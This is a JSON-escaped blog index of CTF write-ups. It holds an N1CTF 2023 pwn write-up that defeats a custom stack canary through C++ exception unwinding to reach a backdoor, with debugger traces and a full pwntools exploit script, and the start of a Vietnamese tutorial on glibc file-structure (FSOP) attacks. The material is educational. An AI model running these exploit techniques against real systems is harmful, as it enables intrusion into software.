io.interactive() ","title":"WannaGame ChampionShip 2023 Writeups"},{"date":"2023-10-24","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/n1ctf/","summary":"N1CTF 2023 Writeups N1-Canary","tags":["C++","ctf","pwn"],"text":"introduction rating weight: 97,33\nduring weekends, i played the n1ctf contest with my teammate cauca. we ranked in the top 45 and i solved 1/4 of the problems in the pwn category.\nn1-canary after the contest, i asked the author for the source of the challenge to make it easier to debug. main.cpp\n#include \u0026#34;sys/random.h\u0026#34; #include \u0026#34;utils.h\u0026#34; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;memory\u0026gt; constexpr size_t canary_randbits = 3; constexpr size_t canary_shiftbits = 4; constexpr size_t canary_pool_size = 1 \u0026lt;\u0026lt; canary_randbits; u64 user_canary[canary_pool_size]; u64 sys_canary[canary_pool_size]; template \u0026lt;size_t size\u0026gt; struct protectedbuffer { char buf[size]; char padding = 0; u64 canary; protectedbuffer() { bzero(buf, sizeof(buf)); canary = getcanary(); } u64 getcanary() { u64 addr = (u64)this; u64 canary_idx = (addr \u0026gt;\u0026gt; canary_shiftbits) \u0026amp; (canary_pool_size - 1); u64 raw_canary = user_canary[canary_idx] ^ sys_canary[canary_idx]; return raw_canary; } void check() { if (canary != getcanary()) { raise(\u0026#34;*** stack smash detected ***\u0026#34;); } } template \u0026lt;typename fn\u0026gt; void mut(fn const \u0026amp;fn) { fn(buf); check(); } }; static void init_canary() { if (sizeof(sys_canary) != getrandom(sys_canary, sizeof(sys_canary), 0)) { raise(\u0026#34;canary init error\u0026#34;); } puts(\u0026#34;to increase entropy, give me your canary\u0026#34;); readall(user_canary); } struct unsafeapp { unsafeapp() { puts(\u0026#34;creating dangerous app...\u0026#34;); } virtual ~unsafeapp() {} virtual void launch() = 0; }; struct bofapp : unsafeapp { void launch() override { protectedbuffer\u0026lt;64\u0026gt; buf; puts(\u0026#34;input something to pwn :)\u0026#34;); buf.mut([](char *p) { scanf(\u0026#34;%[^\\n]\u0026#34;, p); }); puts(buf.buf); } }; static void backdoor() { system(\u0026#34;/readflag\u0026#34;); } int main() { setbuf(stdin, nullptr); setbuf(stdout, nullptr); init_canary(); try { auto app = std::make_unique\u0026lt;bofapp\u0026gt;(); app-\u0026gt;launch(); } catch (...) { puts(\u0026#34;error!!!\u0026#34;); exit(1); } } utils.h\n#pragma once #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;stdexcept\u0026gt; #include \u0026lt;unistd.h\u0026gt; using u64 = unsigned long long; static inline void raise(const char *msg) { puts(msg); throw std::runtime_error(msg); } static inline void readall(void *ptr, size_t size) { char *p = (char *)ptr; size_t tot = 0; while (tot \u0026lt; size) { auto res = read(stdin_fileno, p + tot, size - tot); if (res \u0026lt;= 0) raise(\u0026#34;io error\u0026#34;); tot += res; } } template \u0026lt;typename t\u0026gt; static inline void readall(t \u0026amp;dest) { readall(\u0026amp;dest, sizeof(dest)); } the author of the challenge has implemented a custom canary, as the title suggests.\nstatic void init_canary() { if (sizeof(sys_canary) != getrandom(sys_canary, sizeof(sys_canary), 0)) { raise(\u0026#34;canary init error\u0026#34;); } puts(\u0026#34;to increase entropy, give me your canary\u0026#34;); readall(user_canary); } in main function, an object was actually instantiated and other subsequent functions were called.\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v3; // rax char v5[8]; // [rsp+0h] [rbp-20h] byref unsigned __int64 v6; // [rsp+8h] [rbp-18h] v6 = __readfsqword(0x28u); setbuf(stdin, 0ll); setbuf(_bss_start, 0ll); init_canary(); std::make_unique\u0026lt;bofapp\u0026gt;(v5); v3 = std::unique_ptr\u0026lt;bofapp\u0026gt;::operator-\u0026gt;(v5); (*(void (__fastcall **)(__int64))(*(_qword *)v3 + 16ll))(v3); std::unique_ptr\u0026lt;bofapp\u0026gt;::~unique_ptr(v5); return 0; } i have located the destructor for this object, which will invoke the function pointer.\n__int64 __fastcall std::default_delete\u0026lt;bofapp\u0026gt;::operator()(__int64 a1, __int64 a2) { __int64 result; // rax result = a2; if ( a2 ) return (*(__int64 (__fastcall **)(__int64))(*(_qword *)a2 + 8ll))(a2); return result; } the main function will invoke the bofapp::launch function.\nunsigned __int64 __fastcall bofapp::launch(bofapp *this) { char v2; // [rsp+1fh] [rbp-61h] byref char s[88]; // [rsp+20h] [rbp-60h] byref unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); protectedbuffer\u0026lt;64ul\u0026gt;::protectedbuffer(s); puts(\u0026#34;input something to pwn :)\u0026#34;); protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch(void)::{lambda(char *)#1}\u0026gt;(s, \u0026amp;v2); puts(s); return v4 - __readfsqword(0x28u); it\u0026rsquo;s look safe, we continue in mut function, it take a function as a argument\n_int64 __fastcall protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch(void)::{lambda(char *)#1}\u0026gt;(__int64 a1, __int64 a2) { bofapp::launch(void)::{lambda(char *)#1}::operator()(a2, a1); return protectedbuffer\u0026lt;64ul\u0026gt;::check(a1); } vulnerability through debugging, we can see that there is a stack overflow vulnerability in the function that was called because it calls to scanf(\u0026quot;%[^\\n]\u0026quot;, p) and doesn\u0026rsquo;t check the boundary\nbut it isn\u0026rsquo;t easy to use a normal bof attack, because it calls the function protectedbuffer\u0026lt;64ul\u0026gt;:: check(a1).\nbool __fastcall protectedbuffer\u0026lt;64ul\u0026gt;::check(__int64 a1) { __int64 v1; // rbx bool result; // al v1 = *(_qword *)(a1 + 72); result = v1 != protectedbuffer\u0026lt;64ul\u0026gt;::getcanary(a1); if ( result ) raise(\u0026#34;*** stack smash detected ***\u0026#34;); return result; } if we cannot bypass this, it will trigger a stack smash error. we\u0026rsquo;ll address it later.\nint backdoor(void) { return system(\u0026#34;/readflag\u0026#34;); } i see a backdoor function. how can we call it without bypassing the canary?\nc++ exception handling try { auto app = std::make_unique\u0026lt;bofapp\u0026gt;(); app-\u0026gt;launch(); } catch (...) { puts(\u0026#34;error!!!\u0026#34;); exit(1); } when the check fails, the program will print *** stack smash detected *** using the raise() function. in this case, the program will look for a catch statement to handle the exception and prevent the program from crashing.\n──────────────────────────────────────────────────────────────────────────[ disasm / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────── 0x4018f2 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+40\u0026gt; setne al 0x4018f5 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+43\u0026gt; test al, al 0x4018f7 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+45\u0026gt; je protectedbuffer\u0026lt;64ul\u0026gt;::check()+62 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+62\u0026gt; 0x4018f9 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+47\u0026gt; lea rax, [rip + 0x7be] 0x401900 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+54\u0026gt; mov rdi, rax ► 0x401903 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+57\u0026gt; call raise(char const*) \u0026lt;raise(char const*)\u0026gt; rdi: 0x4020be ◂— \u0026#39;*** stack smash detected ***\u0026#39; rsi: 0xa rdx: 0x0 rcx: 0x20 0x401908 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+62\u0026gt; nop 0x401909 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+63\u0026gt; mov rbx, qword ptr [rbp - 8] 0x40190d \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+67\u0026gt; leave 0x40190e \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+68\u0026gt; ret 0x40190f nop ────────────────────────────────────────────────────────────────────────────────────────[ stack ]──────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffdf367cad0 ◂— 9 /* \u0026#39;\\t\u0026#39; */ 01:0008│ 0x7ffdf367cad8 —▸ 0x7ffdf367cb40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; 02:0010│ 0x7ffdf367cae0 —▸ 0x7ffdf367cb40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; 03:0018│ 0x7ffdf367cae8 —▸ 0x7ffdf367cce8 —▸ 0x7ffdf367e21e ◂— 0x74756f2e612f2e /* \u0026#39;./a.out\u0026#39; */ 04:0020│ rbp 0x7ffdf367caf0 —▸ 0x7ffdf367cb10 —▸ 0x7ffdf367cba0 ◂— 0x0 05:0028│ 0x7ffdf367caf8 —▸ 0x401739 (void protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch()::{lambda(char*)#1}\u0026gt;(bofapp::launch()::{lambda(char*)#1} const\u0026amp;)+51) ◂— nop 06:0030│ 0x7ffdf367cb00 —▸ 0x7ffdf367cb3f ◂— 0x4141414141414100 07:0038│ 0x7ffdf367cb08 —▸ 0x7ffdf367cb40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; ──────────────────────────────────────────────────────────────────────────────────────[ backtrace ]────────────────────────────────────────────────────────────────────────────────────── ► 0 0x401903 protectedbuffer\u0026lt;64ul\u0026gt;::check()+57 1 0x401739 void protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch()::{lambda(char*)#1}\u0026gt;(bofapp::launch()::{lambda(char*)#1} const\u0026amp;)+51 2 0x40169d bofapp::launch()+77 3 0x403407 4 0x4f4ab0 5 0x4f4ab0 6 0x12000 7 0x7ffdf367cce8 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; stack unwinding if it is not found in this function, it will be searched up along the function call chain, and there will be two results:\nfind the catch, record the catch location, clean the stack starting from the function that throws the exception, until you reach the function where the catch is located, and enter the catch code for processing if the corresponding catch is not found after walking through the call chain, then call std::terminate(), this function to abort the program by default. if you are curious about that, please feel free to read the article.\nthe next functions called in sequence are: raise-\u0026gt;__cxa_throw-\u0026gt;_unwind_raiseexception.\n► 0x404056 \u0026lt;__cxa_throw+54\u0026gt; call _unwind_raiseexception \u0026lt;_unwind_raiseexception\u0026gt; rdi: 0x12c13b0 ◂— 0x474e5543432b2b00 rsi: 0x4e76f0 (typeinfo for std::runtime_error) —▸ 0x4e75e0 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x404120 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64 rdx: 0x404740 (std::runtime_error::~runtime_error()) ◂— endbr64 rcx: 0x12c1408 ◂— \u0026#39;*** stack smash detected ***\u0026#39; the function _unwind_raiseexception() takes the address of each frame below to locate the corresponding catch. if it fails to find one, the function calls std::terminate() to abort and exit the program.\n──────────────────────────────────────────────────────────────────────────────────────[ backtrace ]────────────────────────────────────────────────────────────────────────────────────── ► 0 0x404056 __cxa_throw+54 1 0x402178 raise(char const*)+83 2 0x4026b2 protectedbuffer\u0026lt;64ul\u0026gt;::check()+62 3 0x4024e3 void protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch()::{lambda(char*)#1}\u0026gt;(bofapp::launch()::{lambda(char*)#1} const\u0026amp;)+51 4 0x40245a bofapp::launch()+62 5 0xdeadbeef 6 0xdeadbeef 7 0xdeadbeef ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── so, if we want to continue the flow execution in main, we much provide exactly where the address of the catch block is, so we can continue to exploit it that don\u0026rsquo;t terminate program.\ni have found out the address 0x4022de that make the program continue execution because it is where the catch block lie.\n0x41acdd \u0026lt;_unwind_raiseexception+909\u0026gt; mov r14, qword ptr [rbp - 0x10] 0x41ace1 \u0026lt;_unwind_raiseexception+913\u0026gt; mov r15, qword ptr [rbp - 8] 0x41ace5 \u0026lt;_unwind_raiseexception+917\u0026gt; mov rbp, qword ptr [rbp] 0x41ace9 \u0026lt;_unwind_raiseexception+921\u0026gt; mov rsp, rcx 0x41acec \u0026lt;_unwind_raiseexception+924\u0026gt; pop rcx ► 0x41aced \u0026lt;_unwind_raiseexception+925\u0026gt; jmp rcx \u0026lt;main+116\u0026gt; ↓ 0x4022f1 \u0026lt;main+116\u0026gt; endbr64 0x4022f5 \u0026lt;main+120\u0026gt; mov rbx, rax 0x4022f8 \u0026lt;main+123\u0026gt; lea rax, [rbp - 0x18] 0x4022fc \u0026lt;main+127\u0026gt; mov rdi, rax 0x4022ff \u0026lt;main+130\u0026gt; call std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr() \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()\u0026gt; we successfully changed its flow! it will call to exit() to terminate the program without return. how can we execute the backdoor() function?\nafterwards, the program will proceed to execute the destructor method of this particular object. let\u0026rsquo;s delve deeper into this process:\n0x4022f1 \u0026lt;main+116\u0026gt; endbr64 0x4022f5 \u0026lt;main+120\u0026gt; mov rbx, rax 0x4022f8 \u0026lt;main+123\u0026gt; lea rax, [rbp - 0x18] 0x4022fc \u0026lt;main+127\u0026gt; mov rdi, rax ► 0x4022ff \u0026lt;main+130\u0026gt; call std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr() \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()\u0026gt; rdi: 0x7ffe1006ece8 —▸ 0x7ffe1006ed40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; rsi: 0x4022f1 (main+116) ◂— endbr64 rdx: 0x1 rcx: 0x4022f1 (main+116) ◂— endbr64 arbitrary execution we go through and see this will cause sigsev when rdx doesn\u0026rsquo;t point to a valid address,\n0x4027d7 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+29\u0026gt; mov rdx, qword ptr [rax] 0x4027da \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+32\u0026gt; add rdx, 8 ► 0x4027de \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+36\u0026gt; mov rdx, qword ptr [rdx] 0x4027e1 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+39\u0026gt; mov rdi, rax 0x4027e4 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+42\u0026gt; call rdx as long as you control the rax register, you can control the rdx register, which results in arbitrary execution.\nthis function takes out the data from the stack combined with the stack overflow above we can control the rax register.\n0x4025c9 \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+57\u0026gt; mov rbx, rax 0x4025cc \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+60\u0026gt; mov rax, qword ptr [rbp - 0x18] 0x4025d0 \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+64\u0026gt; mov rdi, rax ► 0x4025d3 \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+67\u0026gt; call std::remove_reference\u0026lt;bofapp*\u0026amp;\u0026gt;::type\u0026amp;\u0026amp; std::move\u0026lt;bofapp*\u0026amp;\u0026gt;(bofapp*\u0026amp;) \u0026lt;std::remove_reference\u0026lt;bofapp*\u0026amp;\u0026gt;::type\u0026amp;\u0026amp; std::move\u0026lt;bofapp*\u0026amp;\u0026gt;(bofapp*\u0026amp;)\u0026gt; rdi: 0x4022c6 (main+73) ◂— call 0xffffffffe907ac13 rsi: 0x4022f1 (main+116) ◂— endbr64 rdx: 0x1 rcx: 0x4022f1 (main+116) ◂— endbr64 finally, we manage to control rdx register to point to the backdoor() function.\n0x4027d5 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+27\u0026gt; je std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+44 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+44\u0026gt; 0x4027d7 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+29\u0026gt; mov rdx, qword ptr [rax] 0x4027da \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+32\u0026gt; add rdx, 8 0x4027de \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+36\u0026gt; mov rdx, qword ptr [rdx] 0x4027e1 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+39\u0026gt; mov rdi, rax ► 0x4027e4 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+42\u0026gt; call rdx \u0026lt;backdoor()\u0026gt; rdi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0 rsi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0 rdx: 0x402263 (backdoor()) ◂— endbr64 rcx: 0x4022f1 (main+116) ◂— endbr64 0x4027e6 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+44\u0026gt; nop 0x4027e7 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+45\u0026gt; leave 0x4027e8 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+46\u0026gt; ret 0x4027e9 nop 0x4027ea \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::get() const\u0026gt; endbr64 [debug] received 0x1c bytes: b\u0026#39;sh: 1: /readflag: not found\\n\u0026#39; sh: 1: /readflag: not found exploit script solve.py\nfrom pwn import * import time if args.local: io=process(\u0026#39;./a.out\u0026#39;) if args.gdb: cmd=\u0026#34;\u0026#34;\u0026#34; b* 0x420978 b* 0x4038fc c \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, gdbscript=cmd) else: io=remote(\u0026#39;43.132.193.22\u0026#39;, 9999) elf=context.binary=elf(\u0026#39;./a.out\u0026#39;) context.log_level=\u0026#39;debug\u0026#39; system=0x000000000042dc10 pop_rdi=0x0000000000403090 bin_sh=0x4bdd62 backdoor=0x000000000403387 user_canary=0x4f4aa0 pl=p64(backdoor)*2+p64(0x4f4aa0) # fake obj pause() io.send(pl+(64-len(pl))*b\u0026#39;\\0\u0026#39;) sleep(1) pl=b\u0026#39;a\u0026#39;*96+p64(0)+p64(0x0000000000403407)+p64(0x4f4aa0+8*2)*2 pause() sleep(1) io.sendline(pl) sleep(1) io.interactive() reference https://maskray.me/blog/2020-11-08-stack-unwinding\nhttps://github.com/chop-project/\nhttps://www.cnblogs.com/catch/p/3604516.html\nhttps://baiy.cn/doc/cpp/inside_exception.htm\n","title":"N1CTF 2023 Writeups"},{"date":"2023-08-08","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/fsop/","summary":"FSOP ATTACK","tags":["ctf","pwn","technique"],"text":"file structure tags: fsop technique pwn hacking nói về file structure attack (fsop), nếu là 1 người chơi pwn chắc hẳn mọi người cũng đã có nghe qua. bản thân mình cũng mơ hồ về loại tấn công này, nên mình quyết định viết 1 bài research về nó.\ntheo mình tìm hiểu, thì kỹ thuật này được angelboy public qua bài viết play with file structure - yet another binary exploit technique.\nmình bắt đầu đi vào các phần cơ bản nhất!\n1. file operator file là 1 kiểu dữ liệu được định nghĩa trong glibc và thường được dùng khi muốn mở 1 file trong ngôn ngữ lập trình c. tất nhiên, nó khác với khái niệm file descriptor mà chúng ta thường dùng. mục đích của việc dùng file là để việc thao tác với các file operation nhanh hơn bằng cách sử dụng buffer để giảm thiểu số lượng syscall được gọi (_io_syscall read, write, \u0026hellip;.). vấn đề này mình sẽ giải thích kĩ hơn ở các phần sau.\n2. diving into glibc code mình sẽ sử dụng glibc-2.35 source code để tìm hiểu về file structure. file\ntypedef struct _io_file file vậy, type file thực chất là _io_file struct\nnhìn sơ qua _io_file struct trong glibc 2.35: _io_file\nstruct _io_file { int _flags;\t/* high-order word is _io_magic; rest is flags. */ /* the following pointers correspond to the c++ streambuf protocol. */ char *_io_read_ptr;\t/* current read pointer */ char *_io_read_end;\t/* end of get area. */ char *_io_read_base;\t/* start of putback+get area. */ char *_io_write_base;\t/* start of put area. */ char *_io_write_ptr;\t/* current put pointer. */ char *_io_write_end;\t/* end of put area. */ char *_io_buf_base;\t/* start of reserve area. */ char *_io_buf_end;\t/* end of reserve area. */ /* the following fields are used to support backing up and undo. */ char *_io_save_base; /* pointer to start of non-current get area. */ char *_io_backup_base; /* pointer to first valid character of backup area */ char *_io_save_end; /* pointer to end of non-current get area. */ struct _io_marker *_markers; struct _io_file *_chain; int _fileno; int _flags2; __off_t _old_offset; /* this used to be _offset but it\u0026#39;s too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _io_lock_t *_lock; #ifdef _io_use_old_io_file }; nhìn thoáng qua, rất nhiều kiểu dữ liệu được khai báo trong struct.\nba loại file cơ bản thường được khai báo trong chương trình (nằm trên binary và trỏ đến structure trên libc):\n_io_2_1_stderr _io_2_1_stdout _io_2_1_stdin riêng stdout có thể ở chế độ unbuffered, line-buffered, hoặc fully-buffered.\nunbuffered - chương trình sẽ in ra thiết bị xuất chuẩn càng sớm càng tốt (không hạn chế). line-buffered - chương trình sẽ in ra thiết bị xuất chuẩn khi gặp kí tự new-line. fully-buffered - chương trình sẽ in ra thiết bị xuất chuẩn khi stdout buffers đầy. _io_list-all\nstruct _io_file_plus *_io_list_all = \u0026amp;_io_2_1_stderr_; glibc mặc định biến _io_list_all chứa 1 linked list tất cả các type file trong binary. mặc định _io_list_all sẽ trỏ tới stderr đầu tiên. các phần tử tiếp theo sẽ được truy cập qua thuộc tính _chain .\npwndbg\u0026gt; p \u0026amp;_io_list_all $8 = (_io_file_plus **) 0x7ffff7dd5520 \u0026lt;__gi__io_list_all\u0026gt; pwndbg\u0026gt; p _io_list_all $9 = (_io_file_plus *) 0x7ffff7dd5540 \u0026lt;_io_2_1_stderr_\u0026gt; pwndbg\u0026gt; p _io_2_1_stderr_.file._chain $10 = (_io_file *) 0x7ffff7dd5620 \u0026lt;_io_2_1_stdout_\u0026gt; pwndbg\u0026gt; p _io_2_1_stdout_.file._chain $11 = (_io_file *) 0x7ffff7dd48e0 \u0026lt;_io_2_1_stdin_\u0026gt; _chain\nđặc biệt, file còn được bao gồm trong struct _io_file_plus\n_io_file_plus\nstruct _io_file_plus { file file; const struct _io_jump_t *vtable; }; glibc-2.35 có thêm struct _io_file_plus là bản mở rộng của struct _io_file vì chỉ có chứa thêm ptr vtable, và mọi file đều dùng chung 1 vtable. thường mọi file (cả 3 file cơ bản cũng dùng _io_file_plus hơn là _io_file).\npwndbg\u0026gt; p _io_2_1_stdout_ $12 = { file = { _flags = -72537977, _io_read_ptr = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_read_end = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_read_base = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_write_base = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_write_ptr = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_write_end = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_buf_base = 0x7ffff7dd56a3 \u0026lt;_io_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _io_buf_end = 0x7ffff7dd56a4 \u0026lt;_io_2_1_stdout_+132\u0026gt; \u0026#34;\u0026#34;, _io_save_base = 0x0, _io_backup_base = 0x0, _io_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd48e0 \u0026lt;_io_2_1_stdin_\u0026gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 \u0026#39;\\000\u0026#39;, _shortbuf = \u0026#34;\\n\u0026#34;, _lock = 0x7ffff7dd6780 \u0026lt;_io_stdfile_1_lock\u0026gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd47a0 \u0026lt;_io_wide_data_1\u0026gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = 0x7ffff7dd36e0 \u0026lt;__gi__io_file_jumps\u0026gt; } vtable có kiểu dữ liệu là _io_jump_t _io_jump_t\nstruct _io_jump_t { jump_field(size_t, __dummy); jump_field(size_t, __dummy2); jump_field(_io_finish_t, __finish); jump_field(_io_overflow_t, __overflow); jump_field(_io_underflow_t, __underflow); jump_field(_io_underflow_t, __uflow); jump_field(_io_pbackfail_t, __pbackfail); /* showmany */ jump_field(_io_xsputn_t, __xsputn); jump_field(_io_xsgetn_t, __xsgetn); jump_field(_io_seekoff_t, __seekoff); jump_field(_io_seekpos_t, __seekpos); jump_field(_io_setbuf_t, __setbuf); jump_field(_io_sync_t, __sync); jump_field(_io_doallocate_t, __doallocate); jump_field(_io_read_t, __read); jump_field(_io_write_t, __write); jump_field(_io_seek_t, __seek); jump_field(_io_close_t, __close); jump_field(_io_stat_t, __stat); jump_field(_io_showmanyc_t, __showmanyc); jump_field(_io_imbue_t, __imbue); }; struct này chứa các con trỏ đến các phương thức io cần thiết trong lúc xử lí file (fopen, fread, fwrite, fclose,\u0026hellip;).\nví dụ khi thực hiện mở 1 file thông qua fopen(): -\u0026gt; các bước open file:\nmalloc file structure gán vtable vào file structure khởi tạo file structure liên kết file structure vào _io_list_all call fopen() gán vtable vào file structure\n_io_jumps (\u0026amp;new_f-\u0026gt;fp) = \u0026amp;_io_file_jumps; _io_file_jumps là bảng 1 trong nhiềuvtable đã tồn tại trong chương trình. khởi tạo vtable với _io_file_jumps khi mở file. làm sao để gọi hàm đó ?\ntypedef void (*_io_finish_t) (_io_file *, int); khi thực hiện _io_finish(fp), nó sẽ gọi đến hàm được lưu trong vtable của file được truyền vào, với chỉ mục kiểu int là vị trí của hàm _io_finish_t trong bảng vtable.\nhmm, mình đã khái quát xong. tóm gọn lại, nếu chúng ta có thể ghi đè 1 file structure nào đó, thì ta có thể điều khiển được nơi mà chúng ta có thể ghi, đọc -\u0026gt; read/write primitive . điều đó khá là dễ dàng nhưng chúng ta cần chú ý các điều kiện.\nvậy mình đặt câu hỏi trong đầu: liệu có thể điều khiển được luồng thực thi sang hướng khác nếu như mình có thể ghi đè phân vùng vtable không ?\nmình sẽ nói rõ hơn phần đó trong phần cuối cùng !\n3. leak libc via _io_file (read primitive) làm sao chúng ta có thể leak được địa chỉ của libc thông qua fsop attack ?\ntrước hết, tìm hiểu cách hoạt động của hàm puts trong c (glibc-2.35).\nchương trình đơn giản sau thực hiện việc in chuỗi ra thiết bị xuất chuẩn\n#include \u0026lt;stdio.h\u0026gt; int main(){ puts(\u0026#34;fsop attack\u0026#34;); return 0; } mình setup source code và compile với glibc-2.35 bằng câu lệnh sau\n$ wget https://ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gz $ tar -xvf glibc-2.35.tar.gz * run binary in gdb pwndbg\u0026gt; dir glibc-2.35/libio/ sau khi load source code vào chúng ta có thể dễ dàng debug hơn với code c.\ndebug binary bằng gdb:\npwndbg\u0026gt; disassemble main dump of assembler code for function main: 0x0000000000001149 \u0026lt;+0\u0026gt;: endbr64 0x000000000000114d \u0026lt;+4\u0026gt;: push rbp 0x000000000000114e \u0026lt;+5\u0026gt;: mov rbp,rsp 0x0000000000001151 \u0026lt;+8\u0026gt;: lea rax,[rip+0xeac] # 0x2004 0x0000000000001158 \u0026lt;+15\u0026gt;: mov rdi,rax 0x000000000000115b \u0026lt;+18\u0026gt;: call 0x1050 \u0026lt;puts@plt\u0026gt; 0x0000000000001160 \u0026lt;+23\u0026gt;: mov eax,0x0 0x0000000000001165 \u0026lt;+28\u0026gt;: pop rbp 0x0000000000001166 \u0026lt;+29\u0026gt;: ret end of assembler dump. mình đặt breakpoints tại hàm chỗ gọi đên hàm puts@plt để xem nó làm gì.\nrõ ràng, nó gọi đến hàm _io_puts trong thư viện _io_puts\nint _io_puts (const char *str) { int result = eof; size_t len = strlen (str); _io_acquire_lock (stdout); if ((_io_vtable_offset (stdout) != 0 || _io_fwide (stdout, -1) == -1) \u0026amp;\u0026amp; _io_sputn (stdout, str, len) == len 